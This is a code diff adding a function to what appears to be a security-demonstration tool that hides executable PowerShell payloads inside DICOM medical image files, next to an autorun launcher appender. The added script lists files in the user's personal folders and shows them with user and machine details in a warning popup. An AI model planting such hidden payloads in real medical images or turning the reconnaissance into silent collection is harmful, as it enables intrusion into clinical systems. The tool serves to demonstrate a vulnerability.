@@ -480,6 +480,78 @@ Start-Process notepad.exe $tmp
     return build_script_payload(script.encode("utf-8"))
 
 
+def embed_script_file_lister_payload() -> bytes:
+    """Embed a PowerShell script that lists user files and shows them in a popup window.
+
+    Opens a Windows Forms GUI window displaying files found in Desktop, Documents,
+    Downloads, Pictures, Music and Videos — demonstrating silent file system access
+    from within a hidden DICOM payload.
+    """
+    script = r"""
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "DICOM Security Alert - Hidden Payload Executed"
+$form.Size = New-Object System.Drawing.Size(650, 550)
+$form.StartPosition = "CenterScreen"
+$form.TopMost = $true
+$form.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
+
+$header = New-Object System.Windows.Forms.Label
+$header.Text = "WARNING: Hidden DICOM Script Accessed Your File System"
+$header.ForeColor = [System.Drawing.Color]::Red
+$header.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
+$header.Location = New-Object System.Drawing.Point(10, 10)
+$header.Size = New-Object System.Drawing.Size(620, 30)
+$form.Controls.Add($header)
+
+$sub = New-Object System.Windows.Forms.Label
+$sub.Text = "User: $env:USERNAME   |   Machine: $env:COMPUTERNAME   |   OS: $([System.Environment]::OSVersion.VersionString)"
+$sub.ForeColor = [System.Drawing.Color]::Orange
+$sub.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$sub.Location = New-Object System.Drawing.Point(10, 45)
+$sub.Size = New-Object System.Drawing.Size(620, 20)
+$form.Controls.Add($sub)
+
+$txt = New-Object System.Windows.Forms.TextBox
+$txt.Multiline = $true
+$txt.ScrollBars = "Vertical"
+$txt.Location = New-Object System.Drawing.Point(10, 75)
+$txt.Size = New-Object System.Drawing.Size(615, 410)
+$txt.ReadOnly = $true
+$txt.BackColor = [System.Drawing.Color]::FromArgb(15, 15, 15)
+$txt.ForeColor = [System.Drawing.Color]::LimeGreen
+$txt.Font = New-Object System.Drawing.Font("Consolas", 9)
+$form.Controls.Add($txt)
+
+$lines = @()
+$lines += "=== FILES ACCESSED BY HIDDEN DICOM PAYLOAD ==="
+$lines += "Timestamp : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+$lines += "Profile   : $env:USERPROFILE"
+$lines += ""
+
+$dirs = @("Desktop","Documents","Downloads","Pictures","Music","Videos")
+foreach ($dir in $dirs) {
+    $path = Join-Path $env:USERPROFILE $dir
+    if (Test-Path $path) {
+        $items = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 20
+        $lines += "[$dir] ($($items.Count) items shown)"
+        foreach ($item in $items) {
+            $tag = if ($item.PSIsContainer) { "[DIR] " } else { "[FILE]" }
+            $lines += "  $tag $($item.Name)"
+        }
+        $lines += ""
+    }
+}
+
+$lines += "--- DICOM AI Security Demo ---"
+$txt.Text = $lines -join "`r`n"
+$form.ShowDialog() | Out-Null
+"""
+    return build_script_payload(script.strip().encode("utf-8"))
+
+
 def append_autorun_launcher(dicom_bytes: bytes) -> bytes:
     """Append the self-extracting launcher to a DICOM file.
 
